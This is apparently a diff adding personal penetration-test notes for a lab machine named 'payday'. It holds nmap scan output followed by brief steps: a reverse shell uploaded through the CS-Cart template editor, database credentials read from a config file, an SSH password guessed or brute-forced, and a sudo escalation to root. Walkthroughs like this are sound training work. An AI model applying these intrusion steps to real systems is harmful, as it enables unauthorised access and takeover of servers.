@@ -1,0 +1,147 @@
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)
+|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)
+80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
+|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: CS-Cart. Powerful PHP shopping cart software
+110/tcp open  pop3        Dovecot pop3d
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+|_ssl-date: 2026-04-17T05:14:28+00:00; +7s from scanner time.
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Issuer: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2008-04-25T02:02:48
+| Not valid after:  2008-05-25T02:02:48
+| MD5:   90db:2a9a:2d86:29dc:f047:d19d:c636:9c8e
+|_SHA-1: 1bde:08b6:86fc:9892:33c9:7bd4:0125:c572:5b32:d829
+|_pop3-capabilities: STLS PIPELINING RESP-CODES UIDL TOP SASL CAPA
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: completed SASL-IR CHILDREN LITERAL+ IDLE MULTIAPPEND OK SORT LOGINDISABLEDA0001 STARTTLS LOGIN-REFERRALS IMAP4rev1 Capability THREAD=REFERENCES UNSELECT NAMESPACE
+|_ssl-date: 2026-04-17T05:14:27+00:00; +6s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Issuer: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2008-04-25T02:02:48
+| Not valid after:  2008-05-25T02:02:48
+| MD5:   90db:2a9a:2d86:29dc:f047:d19d:c636:9c8e
+|_SHA-1: 1bde:08b6:86fc:9892:33c9:7bd4:0125:c572:5b32:d829
+445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
+993/tcp open  ssl/imap    Dovecot imapd
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+|_imap-capabilities: SASL-IR completed LITERAL+ IDLE MULTIAPPEND CHILDREN SORT OK AUTH=PLAINA0001 LOGIN-REFERRALS IMAP4rev1 Capability THREAD=REFERENCES UNSELECT NAMESPACE
+|_ssl-date: 2026-04-17T05:14:27+00:00; +6s from scanner time.
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Issuer: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2008-04-25T02:02:48
+| Not valid after:  2008-05-25T02:02:48
+| MD5:   90db:2a9a:2d86:29dc:f047:d19d:c636:9c8e
+|_SHA-1: 1bde:08b6:86fc:9892:33c9:7bd4:0125:c572:5b32:d829
+995/tcp open  ssl/pop3    Dovecot pop3d
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+|_ssl-date: 2026-04-17T05:14:27+00:00; +6s from scanner time.
+|_pop3-capabilities: PIPELINING SASL(PLAIN) RESP-CODES UIDL TOP USER CAPA
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Issuer: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2008-04-25T02:02:48
+| Not valid after:  2008-05-25T02:02:48
+| MD5:   90db:2a9a:2d86:29dc:f047:d19d:c636:9c8e
+|_SHA-1: 1bde:08b6:86fc:9892:33c9:7bd4:0125:c572:5b32:d829
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.26a)
+|   Computer name: payday
+|   NetBIOS computer name: 
+|   Domain name: 
+|   FQDN: payday
+|_  System time: 2026-04-17T01:14:26-04:00
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+| nbstat: NetBIOS name: PAYDAY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| Names:
+|   PAYDAY<00>           Flags: <unique><active>
+|   PAYDAY<03>           Flags: <unique><active>
+|   PAYDAY<20>           Flags: <unique><active>
+|   MSHOME<1e>           Flags: <group><active>
+|_  MSHOME<00>           Flags: <group><active>
+|_clock-skew: mean: 40m06s, deviation: 1h37m59s, median: 5s
+
+http://192.168.204.39/?version 
+CS-CART: version 1.3.3
+searchsploit CS-CART
+48891.txt
+
+upload php-reverse-shell at http://192.168.204.39/admin.php?target=template_editor
+extension change to .phtml
+
+go http://192.168.204.39/skins/
+click uploaded .phtml
+(don't know why direct http://192.168.204.39/skins/shell.phtml don't work)
+
+# cat /var/www/config.php # this part wasted, totally no use
+$db_host = 'localhost';
+$db_name = 'cscart';
+$db_user = 'root';
+$db_password = 'root';
+
+brute-force in patrick, or can password guessing.
+$ ssh patrick@192.168.204.39
+patrick@payday:~$ sudo -l
+User patrick may run the following commands on this host:
+    (ALL) ALL
+patrick@payday:~$ sudo su
+root@payday:/home/patrick# id
+uid=0(root) gid=0(root) groups=0(root)
+
+############################################################
+
+run groups patrick # to check user groups
